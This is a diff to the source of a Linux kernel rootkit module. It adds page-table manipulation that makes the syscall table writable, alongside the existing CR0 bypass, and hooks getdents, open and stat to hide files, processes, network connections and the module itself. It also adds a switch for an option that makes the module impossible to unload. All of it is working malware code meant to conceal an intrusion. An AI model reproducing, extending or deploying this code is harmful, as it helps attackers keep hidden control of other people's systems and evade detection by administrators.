@@ -11,7 +11,7 @@
 #include <linux/path.h>
 #include <linux/namei.h>
 #include <linux/fs_struct.h>	//for xchg(&current->fs->umask, ... )
-
+#include <asm/cacheflush.h>
 
 #define BEGIN_BUF_SIZE 10000
 #define LOG_SEPARATOR "\n.............................................................\n"
@@ -22,6 +22,12 @@
 #define FILE_SUFFIX ".rootkit"		//hiding files with names ending on defined suffix
 #define COMMAND_CONTAINS ".//./"	//hiding processes which cmdline contains defined text
 #define ROOTKIT_NAME "rootkit"		//you need to type here name of this module to make this module hidden
+#define SYSCALL_MODIFY_METHOD PAGE_RW   //method of making syscall table writeable, CR0 or PAGE_RW
+#define UNABLE_TO_UNLOAD 0
+
+
+#define CR0 0
+#define PAGE_RW 1
 
 #define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
 
@@ -117,6 +123,27 @@ int file_sync(struct file *file)
 }
 
 /*end of functions for r/w files copied from stackoverflow*/
+
+/* 2 below functions are from https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/#phide */
+//Make syscall table  writeable
+int make_rw(unsigned long address){
+ 
+        unsigned int level;
+        pte_t *pte = lookup_address(address, &level);
+        if(pte->pte &~_PAGE_RW){
+                pte->pte |=_PAGE_RW;
+        }
+        return 0;
+}
+ 
+// Make the syscall table  write protected
+int make_ro(unsigned long address){
+ 
+        unsigned int level;
+        pte_t *pte = lookup_address(address, &level);
+        pte->pte = pte->pte &~_PAGE_RW;
+        return 0;
+}
 
 char *read_whole_file(struct file *f, int *return_read)
 {
@@ -717,8 +744,10 @@ end1:
 		    set_fs(old_fs);
 		}
 		kfree(new_path);
-	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
+#if UNABLE_TO_UNLOAD
+	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) { //for unable to unload rootkit
 		ret=-ENOENT;
+#endif
 	} else if (strcmp(filename, "/proc/net/tcp") == 0) {
 		struct file *fake_net=NULL;
 		struct file *real_net=NULL;
@@ -829,10 +858,6 @@ end2:
 		}
 
 		kfree(new_path);
-
-
-	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
-		ret=-ENOENT;
 	} else {
 		ret = ref_sys_open(filename, flags, mode);
 	}
@@ -845,6 +870,7 @@ end:
 asmlinkage long new_sys_stat (const char __user * filename,
         struct __old_kernel_stat __user * statbuf)
 {
+#if UNABLE_TO_UNLOAD
 	long ret;
 	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
 	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
@@ -862,7 +888,10 @@ asmlinkage long new_sys_stat (const char __user * filename,
 	}
 end:
 	kfree(rootkit_path);
-	return ret;
+// 	return ret;
+#else
+	return ref_sys_stat(filename, statbuf);
+#endif
 }
 
 //from https://bbs.archlinux.org/viewtopic.php?id=139406
@@ -935,10 +964,16 @@ static int __init rootkit_start(void)
 		return -1;
 
 	create_files();
+	
+	ref_sys_readlink = (void *)sys_call_table[__NR_readlink];
 
+#if SYSCALL_MODIFY_METHOD==CR0
 	original_cr0 = read_cr0();
-
 	write_cr0(original_cr0 & ~0x00010000);
+#endif
+#if SYSCALL_MODIFY_METHOD==PAGE_RW
+	make_rw((long unsigned int)sys_call_table);
+#endif
 
 	register (getdents);
 	register (getdents64);
@@ -946,9 +981,12 @@ static int __init rootkit_start(void)
 	register (open);
 	register (stat);
 
-	ref_sys_readlink = (void *)sys_call_table[__NR_readlink];
-
+#if SYSCALL_MODIFY_METHOD==CR0
 	write_cr0(original_cr0);
+#endif
+#if SYSCALL_MODIFY_METHOD==PAGE_RW
+	make_ro((long unsigned int)sys_call_table);
+#endif
 
 	return 0;
 }
@@ -959,7 +997,12 @@ static void __exit rootkit_end(void)
 		return;
 	}
 
+#if SYSCALL_MODIFY_METHOD==CR0
 	write_cr0(original_cr0 & ~0x00010000);
+#endif
+#if SYSCALL_MODIFY_METHOD==PAGE_RW
+	make_rw((long unsigned int)sys_call_table);
+#endif
 
 	unregister(getdents);
 	unregister(getdents64);
@@ -967,10 +1010,14 @@ static void __exit rootkit_end(void)
 	unregister(open);
 	unregister(stat);
 
+#if SYSCALL_MODIFY_METHOD==CR0
 	write_cr0(original_cr0);
+#endif
+#if SYSCALL_MODIFY_METHOD==PAGE_RW
+	make_ro((long unsigned int)sys_call_table);
+#endif
 
 	clean_hidden_inodes();
-	msleep(2000);
 }
 
 module_init(rootkit_start);
